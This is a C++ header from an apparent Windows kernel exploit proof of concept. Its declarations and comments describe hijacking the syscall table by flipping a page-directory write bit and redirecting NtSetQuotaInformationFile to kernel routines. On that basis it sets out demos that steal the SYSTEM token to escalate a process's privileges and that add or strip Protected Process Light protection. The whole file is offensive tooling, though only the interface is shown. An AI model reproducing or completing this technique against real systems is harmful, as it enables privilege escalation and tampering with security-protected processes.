#pragma once
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <Psapi.h>
#include <ntstatus.h>
#include <map>
#include "MemHandler.h"

#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))

// ---- HijackedSyscall ---------------------------------------------------------
//
// A single asm stub (syscall.asm) that does:
//      mov r10, rcx
//      mov eax, syscallNumber   ; populated at runtime
//      syscall
//      ret
//
// Because the stub is just the standard syscall ABI, it can call any kernel
// routine with any arity — args 1..4 ride RCX/RDX/R8/R9 and args 5+ ride the
// caller's stack at [rsp+0x28], [rsp+0x30], ... The number of stack args is
// encoded into the low 4 bits of the KiServiceTable entry (see
// pointSyscallTo()) so KiSystemServiceCopyEnd copies them onto the kernel
// stack before invoking the hijacked routine.
//
// Cast HijackedSyscall to the matching PFN_HSC_N type below for the routine
// arity you've redirected the syscall to.
extern "C" NTSTATUS HijackedSyscall(void);

typedef NTSTATUS(NTAPI* PFN_HSC_2)(void*, void*);
typedef NTSTATUS(NTAPI* PFN_HSC_3)(void*, void*, void*);
typedef NTSTATUS(NTAPI* PFN_HSC_4)(void*, void*, void*, void*);
typedef NTSTATUS(NTAPI* PFN_HSC_5)(void*, void*, void*, void*, void*);
typedef NTSTATUS(NTAPI* PFN_HSC_6)(void*, void*, void*, void*, void*, void*);
typedef NTSTATUS(NTAPI* PFN_HSC_7)(void*, void*, void*, void*, void*, void*, void*);
typedef NTSTATUS(NTAPI* PFN_HSC_8)(void*, void*, void*, void*, void*, void*, void*, void*);

class kernelHelper
{
public:
	kernelHelper(MemHandler* objMemHandler);
	~kernelHelper();

	PVOID lpNtosBase = { 0 };

	// Demo 1 (original PoC):
	// Hijack NtSetQuotaInformationFile -> PsLookupProcessByProcessId, call it
	// once for the supplied PID, read ImageFileName out of the returned
	// EPROCESS, restore the syscall table.
	bool codeExecution(DWORD32 processPID);

	// Demo 2 (token-steal privesc):
	//   Hijack #1: NtSetQuotaInformationFile -> PsLookupProcessByProcessId
	//              called twice (target PID and PID 4 / SYSTEM).
	//   Hijack #2: NtSetQuotaInformationFile -> memcpy(dst, src, count)
	//              executed in kernel mode to copy SYSTEM's primary token
	//              over the target's EPROCESS.Token field.
	// Demonstrates redirecting the same hijacked syscall slot to a different
	// kernel routine with a different signature between calls.
	bool privesc(DWORD32 processPID);

	// Demo 3 (PPL toggle):
	//   Hijack #1: PsLookupProcessByProcessId to find target EPROCESS.
	//   Hijack #2: memcpy(targetEPROC + Protection, &newByte, 1) — kernel-mode
	//              1-byte write that flips _PS_PROTECTION.
	// makeProtected = true  -> write 0x61 (PPL / WinTcb signer)
	// makeProtected = false -> write 0x00 (unprotected)
	bool pplToggle(DWORD32 processPID, BOOL makeProtected);

	DWORD64 returnNTBASE();

private:
	PVOID ResolveDriverBase(const wchar_t* strDriverName);

	// One-shot setup: read KiServiceTable / PTE base / PDE address, populate
	// dynamic syscall # and exported kernel routine addresses. Idempotent.
	bool resolveKernelArtifacts();

	// Save original syscall entry + PDE flags, then flip the PDE R/W bit so
	// KiServiceTable becomes writable. Idempotent; pairs with restoreHijack.
	bool prepareHijack();

	// Overwrite the NtSetQuotaInformationFile entry to point at
	// kernelFuncAddr. stackArgCount is (#args - 4) clamped to 0 — it goes
	// into the low 4 bits of the encoded entry so the kernel knows how many
	// 8-byte stack args to copy from the user stack on the way in.
	bool pointSyscallTo(DWORD64 kernelFuncAddr, DWORD stackArgCount);

	// Restore the saved syscall entry and PDE flags.
	bool restoreHijack();

	MemHandler* objMemHandler;

	DWORD64 m_kiServiceTable = 0;
	DWORD64 m_syscallEntryAddr = 0;
	DWORD64 m_kiServiceTablePde = 0;
	DWORD64 m_origPdeFlags = 0;
	DWORD   m_origSyscallEntry = 0;
	DWORD   m_syscallNumber = 0xFFFFFFFF;
	DWORD64 m_psLookupProcessByProcessId = 0;
	DWORD64 m_memcpyAddr = 0;
	bool    m_resolved = false;
	bool    m_hijackPrepared = false;
};
